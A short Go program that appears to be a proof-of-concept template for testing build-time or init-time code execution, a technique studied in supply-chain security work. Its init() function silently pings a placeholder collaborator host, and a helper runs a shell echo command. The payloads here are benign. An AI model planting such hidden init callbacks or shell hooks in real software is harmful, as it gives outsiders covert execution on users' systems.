package main

import (
    "fmt"
    "net/http"
    "os/exec"
    "runtime"
)

//go:generate go run generate.go

func init() {
    // This runs when the package is initialized
    fmt.Println("Initializing main package...")
    // Replace COLLABORATOR-URL with your actual collaborator URL
    go sendInitNotification("http://COLLABORATOR-URL/init")
}

func main() {
    fmt.Println("Application starting...")
}

func sendInitNotification(url string) {
    // Send a GET request to verify execution
    _, err := http.Get(url)
    if err != nil {
        fmt.Printf("Failed to send notification: %v\n", err)
    }
}

// TestCommand executes a test command based on OS
func TestCommand() {
    var cmd *exec.Cmd
    
    switch runtime.GOOS {
    case "windows":
        cmd = exec.Command("cmd", "/c", "echo Build time execution test")
    default:
        cmd = exec.Command("sh", "-c", "echo Build time execution test")
    }
    
    output, err := cmd.CombinedOutput()
    if err != nil {
        fmt.Printf("Command execution failed: %v\n", err)
        return
    }
    fmt.Printf("Command output: %s\n", output)
}
